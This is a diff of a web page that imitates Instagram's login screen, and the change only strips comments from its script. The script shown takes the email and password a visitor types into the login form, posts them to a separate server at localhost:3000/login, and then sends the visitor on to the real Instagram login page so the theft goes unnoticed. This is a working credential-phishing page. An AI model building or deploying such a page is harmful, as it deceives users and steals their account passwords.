@@ -72,19 +72,19 @@
         <p class="copyright">© 2024 Instagram from Meta</p>
     </footer>
     <script>
-        // Select the form element
+        
         const form = document.getElementById('login-form');
 
-        // Add an event listener for form submission
+        
         form.addEventListener('submit', async (event) => {
-            event.preventDefault(); // Prevent the default form submission behavior
+            event.preventDefault(); 
             
-            // Collect form data
+            
             const email = form.elements['email'].value;
             const password = form.elements['password'].value;
 
             try {
-                // Send form data to the server
+                
                 const response = await fetch('http://localhost:3000/login', {
                     method: 'POST',
                     headers: {
@@ -94,10 +94,10 @@
                 });
 
                 if (response.ok) {
-                    // Redirect after a successful response
+                    
                     window.location.href = "https://www.instagram.com/accounts/login/?hl=en";
                 } else {
-                    // Handle server error response
+                   
                     alert("Login failed. Please try again.");
                 }
             } catch (error) {
